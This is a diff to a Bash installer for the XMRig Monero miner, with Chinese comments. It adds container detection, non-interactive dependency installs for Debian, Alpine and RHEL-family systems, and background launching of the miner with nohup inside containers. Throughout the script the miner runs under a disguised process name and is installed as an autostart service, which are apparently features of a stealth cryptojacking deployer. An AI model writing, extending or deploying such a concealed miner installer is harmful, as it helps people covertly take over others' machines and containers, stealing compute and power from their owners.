@@ -142,13 +142,37 @@ detect_cpu_info() {
 detect_system() {
     log_info "检测系统信息..."
     
+    # 检测容器环境
+    IS_CONTAINER=false
+    if [ -f /.dockerenv ] || [ -n "${container:-}" ] || grep -q 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null; then
+        IS_CONTAINER=true
+        log_info "检测到容器环境"
+    fi
+    
     # 检测操作系统
     if [[ "$OSTYPE" == "linux-gnu"* ]]; then
         OS="linux"
+        # 获取发行版信息
+        if [ -f /etc/os-release ]; then
+            . /etc/os-release
+            OS_ID=${ID:-"linux"}
+            OS_VERSION=${VERSION_ID:-"unknown"}
+            OS_NAME=${NAME:-"Linux"}
+        else
+            OS_ID="linux"
+            OS_VERSION="unknown"
+            OS_NAME="Linux"
+        fi
     elif [[ "$OSTYPE" == "darwin"* ]]; then
         OS="macos"
+        OS_ID="macos"
+        OS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "unknown")
+        OS_NAME="macOS"
     elif [[ "$OSTYPE" == "freebsd"* ]]; then
         OS="freebsd"
+        OS_ID="freebsd"
+        OS_VERSION=$(uname -r 2>/dev/null || echo "unknown")
+        OS_NAME="FreeBSD"
     else
         log_error "不支持的操作系统: $OSTYPE"
         exit 1
@@ -195,7 +219,7 @@ get_download_url() {
     log_info "确定下载链接..."
     
     # 根据操作系统和架构确定适当的下载URL
-    case $OS in
+    case $OS_ID in
         ubuntu|debian)
             if [ "$OS_VERSION" = "20.04" ] || [ "$OS_VERSION" = "20" ]; then
                 DISTRO="focal"
@@ -207,11 +231,14 @@ get_download_url() {
                 DISTRO="focal"  # 默认回退
             fi
             ;;
-        centos|rhel|rocky|almalinux)
+        centos|rhel|rocky|almalinux|fedora)
             DISTRO="linux-static"  # RHEL系使用静态构建
             ;;
         freebsd)
             DISTRO="freebsd-static"
+            ;;
+        alpine)
+            DISTRO="linux-static"  # Alpine使用静态构建
             ;;
         *)
             DISTRO="linux-static"  # 默认使用静态构建
@@ -220,7 +247,7 @@ get_download_url() {
     
     # 单独处理macOS
     if [[ "$OSTYPE" == "darwin"* ]]; then
-        if [ "$XMRIG_ARCH" = "arm64" ]; then
+        if [ "$ARCH" = "arm64" ]; then
             FILENAME="xmrig-${VERSION}-macos-arm64.tar.gz"
         else
             FILENAME="xmrig-${VERSION}-macos-x64.tar.gz"
@@ -392,22 +419,47 @@ check_prerequisites() {
 
 # 安装缺少的依赖
 install_missing_dependencies() {
+    # 在容器环境中，优先使用非交互式安装
+    local install_flags=""
+    if [ "$IS_CONTAINER" = true ]; then
+        log_info "容器环境检测到，使用非交互式安装"
+        export DEBIAN_FRONTEND=noninteractive
+        install_flags="-y -qq"
+    else
+        install_flags="-y"
+    fi
+    
     if command -v apt-get >/dev/null 2>&1; then
         # Debian/Ubuntu - 使用类似C3Pool的简单方法
         log_info "更新包列表..."
-        if ! apt-get update -qq; then
+        if ! apt-get update $install_flags; then
             log_warn "包更新失败，但继续执行..."
         fi
         
         log_info "安装缺少的包..."
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            apt-get install -y wget curl tar build-essential cmake git || {
-                log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git"
+            apt-get install $install_flags wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev || {
+                log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev"
                 exit 1
             }
         else
-            apt-get install -y wget curl tar || {
+            apt-get install $install_flags wget curl tar || {
                 log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
+                exit 1
+            }
+        fi
+        
+    elif command -v apk >/dev/null 2>&1; then
+        # Alpine Linux - 容器环境常用
+        log_info "检测到Alpine Linux，安装必要包..."
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            apk add --no-cache wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev || {
+                log_error "安装包失败。请运行: apk add wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev"
+                exit 1
+            }
+        else
+            apk add --no-cache wget curl tar || {
+                log_error "安装包失败。请运行: apk add wget curl tar"
                 exit 1
             }
         fi
@@ -415,12 +467,12 @@ install_missing_dependencies() {
     elif command -v yum >/dev/null 2>&1; then
         # CentOS/RHEL 7
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            yum groupinstall -y "Development Tools" || {
+            yum groupinstall $install_flags "Development Tools" || {
                 log_error "安装开发工具失败。请运行: sudo yum groupinstall \"Development Tools\""
                 exit 1
             }
-            yum install -y wget curl tar cmake git || {
-                log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git"
+            yum install $install_flags wget curl tar cmake git libuv-devel openssl-devel hwloc-devel || {
+                log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git libuv-devel openssl-devel hwloc-devel"
                 exit 1
             }
         else
@@ -985,6 +1037,14 @@ EOF
 setup_autostart() {
     log_info "设置系统自启动..."
     
+    # 在容器环境中，通常不需要设置系统服务
+    if [ "$IS_CONTAINER" = true ]; then
+        log_info "容器环境检测到，跳过系统服务设置"
+        log_info "在容器中，请使用以下命令直接运行："
+        log_info "  $WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json"
+        return 0
+    fi
+    
     if command -v systemctl >/dev/null 2>&1; then
         # 使用systemd
         create_systemd_service
@@ -997,6 +1057,29 @@ setup_autostart() {
 # 启动挖矿
 start_mining() {
     log_info "启动挖矿服务..."
+    
+    # 在容器环境中，直接启动进程而不是服务
+    if [ "$IS_CONTAINER" = true ]; then
+        log_info "容器环境检测到，直接启动挖矿进程..."
+        cd "$WORK_DIR"
+        
+        # 在后台启动挖矿进程
+        nohup ./"$DISGUISE_NAME" --config=config.json > /dev/null 2>&1 &
+        local mining_pid=$!
+        
+        # 等待一下确保进程启动
+        sleep 3
+        
+        # 检查进程是否成功启动
+        if kill -0 "$mining_pid" 2>/dev/null; then
+            log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
+            echo "$mining_pid" > "$WORK_DIR/xmrig.pid"
+        else
+            log_error "挖矿进程启动失败"
+            return 1
+        fi
+        return 0
+    fi
     
     if command -v systemctl >/dev/null 2>&1; then
         systemctl start ${SERVICE_NAME}.service
@@ -1019,19 +1102,37 @@ show_status() {
     log_info "捐赠设置: 0%"
     log_info "进程名称: $DISGUISE_NAME"
     log_info "服务名称: $SERVICE_NAME"
+    log_info "运行环境: $([ "$IS_CONTAINER" = true ] && echo "容器环境" || echo "主机环境")"
     echo
     log_info "=== 管理命令 ==="
-    if command -v systemctl >/dev/null 2>&1; then
-        log_info "查看状态: systemctl status $SERVICE_NAME"
-        log_info "停止挖矿: systemctl stop $SERVICE_NAME"
-        log_info "启动挖矿: systemctl start $SERVICE_NAME"
-        log_info "重启挖矿: systemctl restart $SERVICE_NAME"
-        log_info "查看日志: journalctl -u $SERVICE_NAME -f"
+    
+    if [ "$IS_CONTAINER" = true ]; then
+        log_info "容器环境管理命令:"
+        log_info "查看进程: ps aux | grep $DISGUISE_NAME"
+        log_info "停止挖矿: pkill -f $DISGUISE_NAME"
+        log_info "手动启动: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
+        log_info "后台启动: cd $WORK_DIR && nohup ./$DISGUISE_NAME --config=config.json > /dev/null 2>&1 &"
+        if [ -f "$WORK_DIR/xmrig.pid" ]; then
+            local pid=$(cat "$WORK_DIR/xmrig.pid")
+            if kill -0 "$pid" 2>/dev/null; then
+                log_info "当前状态: 运行中 (PID: $pid)"
+            else
+                log_info "当前状态: 已停止"
+            fi
+        fi
     else
-        log_info "查看状态: service $SERVICE_NAME status"
-        log_info "停止挖矿: service $SERVICE_NAME stop"
-        log_info "启动挖矿: service $SERVICE_NAME start"
-        log_info "重启挖矿: service $SERVICE_NAME restart"
+        if command -v systemctl >/dev/null 2>&1; then
+            log_info "查看状态: systemctl status $SERVICE_NAME"
+            log_info "停止挖矿: systemctl stop $SERVICE_NAME"
+            log_info "启动挖矿: systemctl start $SERVICE_NAME"
+            log_info "重启挖矿: systemctl restart $SERVICE_NAME"
+            log_info "查看日志: journalctl -u $SERVICE_NAME -f"
+        else
+            log_info "查看状态: service $SERVICE_NAME status"
+            log_info "停止挖矿: service $SERVICE_NAME stop"
+            log_info "启动挖矿: service $SERVICE_NAME start"
+            log_info "重启挖矿: service $SERVICE_NAME restart"
+        fi
     fi
     echo
     log_info "配置文件: $WORK_DIR/config.json"
